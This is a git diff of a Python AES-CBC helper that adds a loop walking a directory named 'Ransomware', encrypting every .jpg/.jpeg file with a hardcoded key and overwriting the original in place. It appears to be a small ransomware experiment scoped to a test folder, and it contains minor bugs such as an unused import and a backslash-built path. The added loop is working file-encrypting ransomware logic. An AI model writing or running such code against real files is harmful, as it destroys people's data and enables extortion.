@@ -1,3 +1,5 @@
+from email.utils import encode_rfc2231
+import os
 import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -15,7 +17,7 @@ class AESCipher(object):
         plain_text = self.__pad(plain_text)
         iv = Random.new().read(self.block_size)
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
-        encrypted_text = cipher.encrypt(plain_text.encode())
+        encrypted_text = cipher.encrypt(plain_text)
         return b64encode(iv + encrypted_text).decode("utf-8")
 
     def decrypt(self, encrypted_text):
@@ -29,7 +31,7 @@ class AESCipher(object):
         number_of_bytes_to_pad = self.block_size - len(plain_text) % self.block_size
         ascii_string = chr(number_of_bytes_to_pad)
         padding_str = number_of_bytes_to_pad * ascii_string
-        padded_plain_text = plain_text + padding_str
+        padded_plain_text = plain_text + bytes(padding_str,'utf-8')
         return padded_plain_text
 
     @staticmethod
@@ -37,7 +39,17 @@ class AESCipher(object):
         last_character = plain_text[len(plain_text) - 1:]
         return plain_text[:-ord(last_character)]
 
-fileq=open("test.svg","r")
-aes = AESCipher("mykey")
-out=aes.encrypt(fileq.read())
-open("test.svg", "w").write(out)
+        
+aes=AESCipher("myKey")
+encryption_ext=('.jpeg','.jpg')
+file_paths=[]
+for root, dirs, files in os.walk('/Users/shashank/Ransomware'):
+    for file in files:
+        file_paths, file_ext = os.path.splitext(root+'\\'+file)
+        if file_ext in encryption_ext:
+            p=(file)
+            print(p)
+            fileq=open(os.path.join(root,file),"rb")
+            out=aes.encrypt(fileq.read())
+            open(os.path.join(root,file), "wb").write(out.encode())
+            
